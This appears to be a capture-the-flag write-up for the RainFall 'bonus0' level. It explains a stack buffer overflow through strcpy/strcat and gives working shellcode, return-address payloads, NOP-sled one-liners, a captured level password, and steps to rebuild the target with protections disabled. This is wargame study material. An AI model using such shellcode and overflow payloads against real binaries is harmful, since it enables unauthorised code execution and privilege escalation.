using local variable of p() function; the read buffer
the concatenation in pp() overwrites main's return address
we can specify the return address in second string, bytes[9:13]
we make the return address the stack: the local buffer variable in p() that is used with read() function
the read buffer variable does not get truncated or altered even after p() returns to pp(), and pp() returns to main(), the stack frame for p() still exists

# ---------------------------------------------------------------------

bonus0@RainFall:/tmp$ cat bonus0.py
#!/usr/bin/env python
sh = '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'
print('A'*4095)
print('B'*9 + '\xbf\xff\xe6\x8d'[::-1] + sh)
bonus0@RainFall:/tmp$
bonus0@RainFall:/tmp$
bonus0@RainFall:/tmp$ ./bonus0.py > exploit_b0
bonus0@RainFall:/tmp$
bonus0@RainFall:/tmp$
bonus0@RainFall:/tmp$ (cat exploit_b0 ; cat) | /home/user/bonus0/bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAABBBBBBBBB????1?1?Qh/??? BBBBBBBBB????1?1?Qh/???

whoami
bonus1

cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

// Alex's answer
(python -c "print('A' * 4095)"; python -c "print('B' * 9 + '\xbf\xff\xe6\x7d'[::-1] + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; cat) | ~/bonus0


(python -c "print('A' * 4095)"; python -c "print('B' * 9 + '\xbf\xff\xee\x4d'[::-1] + '\0x90' * 4000 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; cat) | ~/bonus0



`python -c "print('A' * 4095)"`
`python -c "print('B' * 9 + '\xbf\xff\xe6\x7d'[::-1] + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"`



// shellcode
'\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'


# ------------------------------------------------------------------------
# Obtain the next password
# ------------------------------------------------------------------------

# We will overwrite return address of main to call the shellcode payload in function p()'s local buffer.

# The first input will result in a non-NULL terminated string a = "AAAA...."

# The second input will effectively become part of string a.

# The strcpy() will result in copying 44 chars to buffer, followed by NULL terminator, because there happens to be 4 non-zero chars on the stack above end of b.

# buffer is appended with ' ', now 45 chars.

# strcat() appends 24 chars to buffer.

# The return address payload must be at &buffer[54].

# main() stack state:

// return address		4 bytes
// old ebp				4 bytes
// esp alignment		8 bytes
// main.buffer			42 bytes

# The crafted return address will point to somewhere in the middle of the 2000 byte NOP slide preceeding the shellcode, which remains at p()'s buffer[9 + 4 + 2000].

# target return address = p() buffer address (0xbfffe680) + 9 + 4 + 1000

# Run the program
(python -c "print('A' * 20)"; python -c "print('B' * 9 + '\xbf\xff\xea\x75'[::-1] + '\x90' * 2000 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; cat) | ~/bonus0
	
	whoami
	cat /home/user/bonus1/.pass

# Now we can log in as user bonus1
su bonus1
# password: cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9



# ------------------------------------------------------------------------
# Recreate the exploitable program
# ------------------------------------------------------------------------

# As user bonus1:

    # Compile the program in /tmp
    gcc bonus0.c -fno-stack-protector -z execstack -o ft_bonus0

    # Edit suid
    chmod u+s ft_bonus0

    # Move the program to home directory
    chmod +wx ~; mv ft_bonus0 ~

# As user bonus0:

	# In this case, there happens to be 1 non-zero chars above b, so the magic offset changes to 12.
	
	# Run the program
	(python -c "print('A' * 20)"; python -c "print('B' * 12 + '\xbf\xff\xea\x75'[::-1] + '\x90' * 2000 + '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80')"; cat) | /home/user/bonus1/ft_bonus0


